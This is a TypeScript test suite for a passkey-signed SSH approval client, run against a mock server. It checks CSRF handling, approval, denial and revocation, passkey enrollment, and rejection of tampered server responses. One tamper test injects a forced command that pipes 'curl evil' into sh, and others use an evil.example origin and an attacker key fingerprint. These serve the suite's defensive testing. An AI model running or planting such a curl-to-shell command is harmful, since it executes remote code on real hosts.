// Main flows end to end against the mock server (DOM-free).
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { ApiError, createApi, type Api } from "../src/api";
import { encode } from "../src/b64url";
import {
  FlowError,
  PASSKEY_TARGET,
  authorizeAddPasskey,
  completeAction,
  completeLogin,
  completeRegistration,
  explainError,
  nothingChanged,
  prepareAction,
  prepareLogin,
  prepareRegistrationWithCode,
  targetForGrant,
  targetForPending,
  targetForStanding,
} from "../src/flows";
import { canonicalJSON, startMock } from "../mock/server";
import type { ChallengeResponse } from "../src/types";
import { fakeAuth, jarFetch } from "./helpers";

type Mock = ReturnType<typeof startMock>;

async function signedIn(m: Mock) {
  const f = jarFetch();
  const api = createApi({ base: m.url, fetch: f });
  const auth = fakeAuth(m.url);
  await completeLogin(api, auth, await prepareLogin(api));
  return { api, auth, f };
}

describe("seeded mock", () => {
  let m: Mock;
  beforeAll(() => {
    m = startMock({ port: 0, distDir: null });
  });
  afterAll(() => m.stop());

  test("state needs a session", async () => {
    const api = createApi({ base: m.url, fetch: jarFetch() });
    const e = await api.state().catch((x) => x);
    expect(e).toBeInstanceOf(ApiError);
    expect((e as ApiError).code).toBe("unauthenticated");
    expect(explainError(e)).toMatch(/signed out/);
  });

  test("POSTs without X-Aqmas or with a non-JSON type are refused", async () => {
    let r = await fetch(`${m.url}/api/ui/login/begin`, { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" });
    expect(r.status).toBe(403);
    r = await fetch(`${m.url}/api/ui/login/begin`, { method: "POST", headers: { "X-Aqmas": "1", "Content-Type": "text/plain" }, body: "{}" });
    expect(r.status).toBe(415);
    r = await fetch(`${m.url}/api/ui/login/begin`, { method: "POST", headers: { "X-Aqmas": "1", "Content-Type": "application/json", Origin: "https://evil.example" }, body: "{}" });
    expect(r.status).toBe(403);
  });

  test("login, then every request carries the CSRF header, JSON type and same-origin credentials", async () => {
    const { api, f } = await signedIn(m);
    const s = await api.state();
    expect(s.owner.name).toBe("alice");
    expect(s.pending!.length).toBeGreaterThanOrEqual(3);
    const posts = f.log.filter((x) => x.method === "POST");
    expect(posts.length).toBe(2);
    for (const p of f.log) expect(p.credentials).toBe("same-origin");
    for (const p of posts) {
      expect(p.headers.get("X-Aqmas")).toBe("1");
      expect(p.headers.get("Content-Type")).toBe("application/json");
    }
    // login/finish sent {challenge_id, assertion} with the go-webauthn fields.
    const fin = posts[1]!.body as { challenge_id: string; assertion: { response: Record<string, string> } };
    expect(typeof fin.challenge_id).toBe("string");
    expect(Object.keys(fin.assertion.response).sort()).toEqual(["authenticatorData", "clientDataJSON", "signature", "userHandle"]);
  });

  test("approve SSH with a shorter TTL and a 4 h standing approval", async () => {
    const { api, auth, f } = await signedIn(m);
    const s = await api.state();
    const item = s.pending!.find((p) => p.id === "01JDEMO0SSH0DBHOST0000001")!;
    const prep = await prepareAction(api, targetForPending(item), { action: "approve", ttl_seconds: 3600, standing_hours: 4 });
    expect(prep.description.headline).toBe("Approve SSH as alice@db-1 for 1 hour, requested by build-box.");
    expect(prep.description.standing).toBe("Also auto-approve the same request (build-box to alice@db-1) for the next 4 hours.");
    // The challenge the passkey signs is SHA-256(canonical).
    const digest = new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(prep.canonicalText)));
    expect(encode(prep.options.challenge as ArrayBuffer)).toBe(encode(digest));
    expect(auth.gets.length).toBe(1); // only the login so far: nothing signed before confirm

    const res = (await completeAction(api, auth, prep)) as { status: string; grant?: { not_after: string } };
    expect(res.status).toBe("approved");
    const decide = f.log.at(-1)!;
    expect(decide.url).toEndWith(`/api/ui/requests/${item.id}/decide`);
    expect(decide.headers.get("X-Aqmas")).toBe("1");
    expect(Object.keys(decide.body as object).sort()).toEqual(["assertion", "challenge_id"]);

    const applied = m.store.applied.at(-1)!;
    expect(applied.canonical).toMatchObject({ action: "approve", ttl_seconds: 3600, standing_hours: 4, target: "db-1", login_user: "alice" });
    const after = await api.state();
    expect(after.pending!.some((p) => p.id === item.id)).toBe(false);
    expect(after.grants!.some((g) => g.target_host === "db-1" && g.requesting_host === "build-box")).toBe(true);
    expect(after.standing!.some((x) => x.target_host === "db-1" && x.requesting_host === "build-box")).toBe(true);

    // The challenge is single use.
    const again = await completeAction(api, auth, prep).catch((x) => x);
    expect(again).toBeInstanceOf(ApiError);
    expect((again as ApiError).code).toBe("conflict");
  });

  test("deny (also passkey-signed)", async () => {
    const { api, auth } = await signedIn(m);
    const item = (await api.state()).pending!.find((p) => p.id === "01JDEMO0SSH0ROOT00000002")!;
    const prep = await prepareAction(api, targetForPending(item), { action: "deny" });
    expect(prep.description.headline).toBe("Deny SSH as root@ci-1, requested by dev-1.");
    expect(prep.canonical.standing_hours ?? 0).toBe(0);
    const res = (await completeAction(api, auth, prep)) as { status: string };
    expect(res.status).toBe("denied");
  });

  test("enrollment approve", async () => {
    const { api, auth } = await signedIn(m);
    const item = (await api.state()).pending!.find((p) => p.kind === "enrollment")!;
    const prep = await prepareAction(api, targetForPending(item), { action: "approve" });
    expect(prep.description.headline).toBe("Let handheld-zero join the fleet as a trusted host.");
    const res = (await completeAction(api, auth, prep)) as { status: string };
    expect(res.status).toBe("approved");
    expect((await api.state()).pending!.some((p) => p.id === item.id)).toBe(false);
  });

  test("revoke a standing approval and a grant", async () => {
    const { api, auth } = await signedIn(m);
    let s = await api.state();
    const st = s.standing!.find((x) => x.id === "01JDEMO0STANDING000000004")!;
    let prep = await prepareAction(api, targetForStanding(st), { action: "revoke" });
    expect(prep.description.headline).toBe("Stop auto-approving SSH as alice@dev-1 for build-box.");
    await completeAction(api, auth, prep);
    const g = s.grants!.find((x) => x.id === "01JDEMO0GRANT00000000006")!;
    prep = await prepareAction(api, targetForGrant(g), { action: "revoke" });
    expect(prep.description.headline).toBe("Revoke ci-1's SSH access as alice@build-box.");
    await completeAction(api, auth, prep);
    s = await api.state();
    expect(s.standing!.some((x) => x.id === st.id)).toBe(false);
    expect(s.grants!.some((x) => x.id === g.id)).toBe(false);
  });

  test("an assertion over a different challenge is refused by the server", async () => {
    const { api, auth } = await signedIn(m);
    const item = m.store.spawnRequest();
    const prep = await prepareAction(api, targetForPending(item), { action: "approve", ttl_seconds: 900 });
    auth.forceChallenge = new Uint8Array(32).buffer;
    const e = await completeAction(api, auth, prep).catch((x) => x);
    expect((e as ApiError).code).toBe("forbidden");
  });

  test("an expired challenge is refused", async () => {
    const { api, auth } = await signedIn(m);
    const item = m.store.spawnRequest();
    const prep = await prepareAction(api, targetForPending(item), { action: "deny" });
    m.store.challenges.get(prep.challengeId)!.expiresAt = Date.now() - 1;
    const e = await completeAction(api, auth, prep).catch((x) => x);
    expect((e as ApiError).code).toBe("expired");
  });

  test("add a passkey: signed passkey:add unlocks registration", async () => {
    const { api, auth } = await signedIn(m);
    const before = (await api.state()).owner.passkeys;
    const prep = await prepareAction(api, PASSKEY_TARGET, { action: "add" });
    expect(prep.description.headline).toBe("Allow adding a new passkey to aqmas.");
    const reg = await authorizeAddPasskey(api, auth, prep);
    await completeRegistration(api, auth, reg);
    expect((await api.state()).owner.passkeys).toBe(before + 1);
    // register/begin without an enroll code or a signed challenge is refused.
    const e = await api.registerBegin({}).catch((x) => x);
    expect(e).toBeInstanceOf(ApiError);
  });
});

describe("a lying or buggy server is caught before anything is signed", () => {
  let m: Mock;
  beforeAll(() => {
    m = startMock({ port: 0, distDir: null });
  });
  afterAll(() => m.stop());

  async function tampered(edit: (r: ChallengeResponse) => Promise<ChallengeResponse> | ChallengeResponse) {
    const { api, auth } = await signedIn(m);
    const evil: Api = { ...api, challenge: async (o, id, b) => edit(await api.challenge(o, id, b)) };
    const item = m.store.spawnRequest({ ttl_requested: 1800 });
    const e = await prepareAction(evil, targetForPending(item), { action: "approve", ttl_seconds: 1800 }).catch((x) => x);
    expect(e).toBeInstanceOf(FlowError);
    expect(auth.gets.length).toBe(1); // only the login: no passkey prompt for the bad action
    return e as FlowError;
  }

  const sha = async (t: string) => encode(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t))));
  const rewrite = async (r: ChallengeResponse, change: Record<string, unknown>) => {
    const text = canonicalJSON({ ...JSON.parse(r.canonical), ...change });
    const pk = (r.public_key as { publicKey: Record<string, unknown> }).publicKey;
    return { ...r, canonical: text, public_key: { publicKey: { ...pk, challenge: await sha(text) } } };
  };

  test("longer TTL than chosen (consistent canonical + challenge)", async () => {
    const e = await tampered((r) => rewrite(r, { ttl_seconds: 28800 }));
    expect(e.message).toMatch(/ttl_seconds/);
  });

  test("sneaked-in standing approval", async () => {
    expect((await tampered((r) => rewrite(r, { standing_hours: 8 }))).message).toMatch(/standing_hours/);
  });

  test("different target or user", async () => {
    expect((await tampered((r) => rewrite(r, { login_user: "root" }))).message).toMatch(/login_user/);
    expect((await tampered((r) => rewrite(r, { target: "bastion" }))).message).toMatch(/target/);
  });

  test("shown canonical differs from the signed challenge", async () => {
    const e = await tampered((r) => ({ ...r, canonical: canonicalJSON({ ...JSON.parse(r.canonical), nonce: "other" }) }));
    expect(e.message).toMatch(/challenge does not match/);
  });

  test("a field the page can't show (e.g. a forced command)", async () => {
    const e = await tampered((r) => rewrite(r, { force_command: "curl evil | sh" }));
    expect(e.message).toMatch(/force_command/);
  });

  test("non-canonical text (duplicate key)", async () => {
    const e = await tampered((r) => ({ ...r, canonical: r.canonical.replace('"action":"approve"', '"action":"deny","action":"approve"') }));
    expect(e.message).toMatch(/canonical form/);
  });
});

describe("enrollment checks", () => {
  test("the client key and the replace flag must match the card", async () => {
    const m = startMock({ port: 0, distDir: null });
    try {
      const { api } = await signedIn(m);
      const item = (await api.state()).pending!.find((p) => p.kind === "enrollment")!;
      const sha = async (t: string) => encode(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t))));
      for (const change of [{ key_fingerprint: "SHA256:attacker" }, { replaces: true }]) {
        const evil: Api = {
          ...api,
          challenge: async (o, id, b) => {
            const r = await api.challenge(o, id, b);
            const text = canonicalJSON({ ...JSON.parse(r.canonical), ...change });
            const pk = (r.public_key as { publicKey: Record<string, unknown> }).publicKey;
            return { ...r, canonical: text, public_key: { publicKey: { ...pk, challenge: await sha(text) } } };
          },
        };
        const e = await prepareAction(evil, targetForPending(item), { action: "approve" }).catch((x) => x);
        expect(e).toBeInstanceOf(FlowError);
      }
    } finally {
      m.stop();
    }
  });
});

describe("error outcomes", () => {
  test("only refusals before signing, cancelled prompts and 4xx count as 'nothing changed'", () => {
    expect(nothingChanged(new FlowError("x"))).toBe(true);
    expect(nothingChanged(new ApiError(409, "conflict", ""))).toBe(true);
    expect(nothingChanged(Object.assign(new Error("x"), { name: "NotAllowedError" }))).toBe(true);
    expect(nothingChanged(new ApiError(500, "internal", ""))).toBe(false);
    expect(nothingChanged(new ApiError(524, "http_524", ""))).toBe(false);
    expect(nothingChanged(new ApiError(0, "network", ""))).toBe(false);
    expect(nothingChanged(new TypeError("Failed to fetch"))).toBe(false);
  });
});

describe("first run (no passkey yet)", () => {
  let m: Mock;
  beforeAll(() => {
    m = startMock({ port: 0, distDir: null, fresh: true, enrollCode: "424242" });
  });
  afterAll(() => m.stop());

  test("login is impossible, the enroll code registers, then login works", async () => {
    const f = jarFetch();
    const api = createApi({ base: m.url, fetch: f });
    const auth = fakeAuth(m.url);
    const e = await prepareLogin(api).catch((x) => x);
    expect((e as ApiError).code).toBe("conflict");

    expect(await prepareRegistrationWithCode(api, "  ").catch((x) => x)).toBeInstanceOf(FlowError);
    expect(((await prepareRegistrationWithCode(api, "000000").catch((x) => x)) as ApiError).code).toBe("forbidden");

    const reg = await prepareRegistrationWithCode(api, " 424242 ");
    expect(reg.options.authenticatorSelection?.residentKey).toBe("required");
    await completeRegistration(api, auth, reg);
    const fin = f.log.at(-1)!.body as { challenge_id: string; credential: { response: Record<string, unknown> } };
    expect(Object.keys(fin).sort()).toEqual(["challenge_id", "credential"]);
    expect(Object.keys(fin.credential.response).sort()).toEqual(["attestationObject", "clientDataJSON", "transports"]);

    // One-time code.
    expect(((await prepareRegistrationWithCode(api, "424242").catch((x) => x)) as ApiError).code).toBe("forbidden");

    await completeLogin(api, auth, await prepareLogin(api));
    expect((await api.state()).owner.passkeys).toBe(1);
  });
});

describe("server without the grants field", () => {
  test("state has no grants key; UI treats it as unknown, not empty", async () => {
    const m = startMock({ port: 0, distDir: null, grants: false });
    try {
      const { api } = await signedIn(m);
      const s = await api.state();
      expect("grants" in s).toBe(false);
    } finally {
      m.stop();
    }
  });
});
